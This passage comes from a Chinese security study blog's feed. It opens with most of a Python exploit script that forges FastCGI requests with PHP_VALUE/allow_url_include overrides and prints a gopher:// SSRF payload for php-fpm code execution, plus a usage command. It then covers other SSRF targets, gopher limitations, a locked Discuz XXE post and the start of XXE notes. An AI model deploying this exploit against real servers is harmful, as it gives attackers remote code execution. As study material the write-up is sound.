vLen <span class="token operator">=</span> len<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        record <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>nLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>nLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> vLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>vLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>vLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> record <span class="token operator">+</span> name <span class="token operator">+</span> value    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIHeader</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> header    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__FCGI_HEADER_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> header<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIHeader<span class="token punctuation">(</span>header<span class="token punctuation">)</span>            record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">''</span>            <span class="token keyword">if</span> <span class="token string">'contentLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                contentLength <span class="token operator">=</span> int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'paddingLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                skiped <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> record    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nameValuePairs<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> post<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true"># if not self.__connect():</span>        <span class="token comment" spellcheck="true">#    print('connect failure! please check your fasctcgi-server !!')</span>         <span class="token comment" spellcheck="true">#   return</span>        requestId <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span> <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> b<span class="token string">""</span>        beginFCGIRecordContent <span class="token operator">=</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_ROLE_RESPONDER<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>keepalive<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_BEGIN<span class="token punctuation">,</span>                                              beginFCGIRecordContent<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        paramsRecord <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nameValuePairs<span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> nameValuePairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                name <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                value <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span>                paramsRecord <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeNameValueParams<span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>        <span class="token keyword">if</span> paramsRecord<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> paramsRecord<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        <span class="token keyword">if</span> post<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> force_bytes<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print base64.b64encode(request)</span>        <span class="token keyword">return</span> request        <span class="token comment" spellcheck="true"># self.sock.send(request)</span>        <span class="token comment" spellcheck="true"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span>        <span class="token comment" spellcheck="true"># self.requests[requestId]['response'] = b''</span>        <span class="token comment" spellcheck="true"># return self.__waitForResponse(requestId)</span>    <span class="token keyword">def</span> <span class="token function">__waitForResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            buf <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> len<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            data <span class="token operator">+=</span> buf        data <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIRecord<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> response<span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDOUT \                    <span class="token operator">or</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_ERROR                <span class="token keyword">if</span> requestId <span class="token operator">==</span> int<span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> response<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SUCCESS<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fastcgi connect host:{} port:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Php-fpm code execution vulnerability client.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Target host, such as 127.0.0.1'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'What php code your want to execute'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'FastCGI port'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    client <span class="token operator">=</span> FastCGIClient<span class="token punctuation">(</span>args<span class="token punctuation">.</span>host<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    documentRoot <span class="token operator">=</span> <span class="token string">"/"</span>    uri <span class="token operator">=</span> args<span class="token punctuation">.</span>file    content <span class="token operator">=</span> args<span class="token punctuation">.</span>code    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> documentRoot <span class="token operator">+</span> uri<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> documentRoot<span class="token punctuation">,</span>        <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'9985'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_TYPE'</span><span class="token punctuation">:</span> <span class="token string">'application/text'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">"%d"</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span>        <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>params<span class="token punctuation">,</span> content<span class="token punctuation">)</span>    response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"gopher://127.0.0.1:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>args<span class="token punctuation">.</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/_"</span> <span class="token operator">+</span> response<span class="token punctuation">)</span></code></pre><p>使用</p><pre><code>python exp.py -c phpcode -p port host filename</code></pre><p>想写入什么都可。<br>这里需要注意的是，PHP-FRM在接收到请求时，会首先查看要操作的文件是否存在，因此这里需要提供filename并且为已知路径的php文件。</p><h2 id="0x08-其他攻击面"><a href="#0x08-其他攻击面" class="headerlink" title="0x08 其他攻击面"></a>0x08 其他攻击面</h2><p>在一直内网的服务的时候也可以直接通过构造payload直接攻击等<br>基于 TCP Stream 且不做交互的点都可以进行攻击利用：</p><ul><li>HTTP GET/POST</li><li>Redis</li><li>Memcache</li><li>SMTP</li><li>Telnet</li><li>基于一个 TCP 包的 exploit</li><li>FTP（不能实现上传下载文件，但是在有回显的情况下可用于爆破内网 FTP）</li></ul><h2 id="0x09-Gopher的局限性"><a href="#0x09-Gopher的局限性" class="headerlink" title="0x09 Gopher的局限性"></a>0x09 Gopher的局限性</h2><ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li></ul><p>以上摘自<img src="https://blog.chaitin.cn/gopher-attack-surfaces/" alt><br>记录一下踩坑，感觉这些坑多是在ssrf实际操作中存在的，这次gopher的测试其实全是在本地，没与ssrf联动</p><h2 id="0x10-总结"><a href="#0x10-总结" class="headerlink" title="0x10 总结"></a>0x10 总结</h2><p>gopher协议到目前也就学个皮毛，还能更加深入，但是没有必要，等以后需要的时候再回来看。感觉貌似在了解协议之后都可以进行伪造……<br>其次，这次学习，很多点也都没有深入哈，到时候遇到了再细究把，现阶段的任务不是紧追这一个点<br>同时这算是ssrf篇的延申，思维导图会加到ssrf上，这里放个分支</p><h2 id="0x11-PS-思维导图"><a href="#0x11-PS-思维导图" class="headerlink" title="0x11 PS 思维导图"></a>0x11 PS 思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200401191720.png" alt></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zhuanlan.zhihu.com/p/112055947" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/112055947</a><br><a href="https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">https://k-ring.github.io/2019/05/31/%E5%AF%B9%E4%B8%87%E9%87%91%E6%B2%B9gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%BA%94%E7%94%A8/</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a><br><a href="https://www.smi1e.top/%E6%B5%85%E6%9E%90ssrf%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BBredis/" target="_blank" rel="noopener">https://www.smi1e.top/%E6%B5%85%E6%9E%90ssrf%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BBredis/</a><br><a href="https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</a></p><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Discuz!X3.4前台XXE漏洞</title>
      <link href="/1944236470.html"/>
      <url>/1944236470.html</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Please enter the password to read.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="13ddabe4b972e246bed0bdb28b231562e9f51cef7602d46fd733242bbe9df29e"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习笔记</title>
      <link href="/3842592324.html"/>
      <url>/3842592324.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>今天代码审计，看到一个类似有xxe漏洞的点，但是对这个漏洞不熟悉，就整理学习一下。</p><h2 id="0x02-XXE漏洞介绍"><a href="#0x02-XXE漏洞介绍" class="headerlink" title="0x02 XXE漏洞介绍"></a>0x02 XXE漏洞介绍</h2><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序<strong>解析</strong>XML输入时，当<strong>允许引用外部实体</strong>时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。</p><p>通过上面的简介xxe漏洞的关键点（是否可以解析并能加载外部实体）和危害一目了然</p><h2 id="0x03-前置知识"><a href="#0x03-前置知识" class="headerlink" title="0x03 前置知识"></a>0x03 前置知识</h2><p>XXE漏洞是基于XML，首先我们就要对XML有所了解</p><h3 id="3-1什么是XML？"><a href="#3-1什么是XML？" class="headerlink" title="3.1什么是XML？"></a>3.1什么是XML？</h3><p>较为官方的描述：</p><ul><li>XML 指可扩展标记语言（EXtensible Markup Language）。</li><li>XML 是一种很像HTML的标记语言。</li><li>XML 的设计宗旨是传输数据，而不是显示数据。</li><li>XML 标签没有被预定义。您需要自行定义标签。</li><li>XML 被设计为具有自我描述性。</li><li>XML 是 W3C 的推荐标准。</li></ul><p>说实话，看这个没咋看懂，我的理解是XML应该是一种数据格式，用来说明数据，容易让人理解，有点类似于json</p><h3 id="3-2XML用来做什么？"><a href="#3-2XML用来做什么？" class="headerlink" title="3.2XML用来做什么？"></a>3.2XML用来做什么？</h3><p>感觉XML作用类似于JSON，不过当时json还没发育，同时XML也是一种可扩展的html。目前应该主要用来存储和交换数据，同时也用于一些配置文件。以上的一切都基于XML跨平台进行数据交互方便</p><h3 id="3-3XML文档结构和语法"><a href="#3-3XML文档结构和语法" class="headerlink" title="3.3XML文档结构和语法"></a>3.3XML文档结构和语法</h3><p>语法:</p><ol><li>XML元素都必须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ol><p>结构:</p><ol><li>XML 文档声明，在文档的第一行</li><li>XML 文档类型定义，即DTD，XXE 漏洞所在的地方</li><li>XML 文档元素</li></ol><h3 id="3-4DTD"><a href="#3-4DTD" class="headerlink" title="3.4DTD"></a>3.4DTD</h3><p>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p><h4 id="3-4-1DTD文档组成"><a href="#3-4-1DTD文档组成" class="headerlink" title="3.4.1DTD文档组成"></a>3.4.1DTD文档组成</h4><p>一个DTD文档包含:</p><ol><li>元素（ELEMENT）的定义规则；</li><li>元素之间的关系规则；</li><li>属性（ATTLIST）的定义规则；</li><li>可使用的实体（ENTITY）或符号（NOTATION）规则。<br>```xml<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE poem [                            <--根元素的名称 <!ELEMENT poem (author, title, content)>   &lt;—-子元素的名称及顺序 <!ELEMENT author (#PCDATA)>   &lt;—–子元素的数据类 <!ELEMENT title (#PCDATA)> <!ELEMENT content (#PCDATA)>]&gt;                              &lt;—结束标签<br>&lt;!–为元素poem定义了三个子元素author title content，<br>这三个元素必须要出现并且必须按照这个顺序<br>少元素不行，多元素也不行</li></ol><p>–&gt;</p><!--以此为分界,上面为DTO文档,下面是XML文档--><!--指明author,title,content里面的内容是字符串类型--><poem>    <author>王维</author>    <title>鹿柴</title>    <content>空山不见人，但闻人语声。返景入深林，复照青苔上。</content></poem>```<h4 id="3-4-2DTD元素"><a href="#3-4-2DTD元素" class="headerlink" title="3.4.2DTD元素"></a>3.4.2DTD元素</h4><p>元素声明方法:<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112151211-bf0da054-051b-1.png" alt></p><h5 id="3-4-2-1-PCDATA"><a href="#3-4-2-1-PCDATA" class="headerlink" title="3.4.2.1 PCDATA"></a>3.4.2.1 PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp; &lt; &gt; 字符；需要使用 &amp; &lt; &gt; 实体来分别替换它们。</p><h5 id="3-4-2-2-CDATA"><a href="#3-4-2-2-CDATA" class="headerlink" title="3.4.2.2 CDATA"></a>3.4.2.2 CDATA</h5><p>CDATA 的意思是字符数据（character data）。CDATA 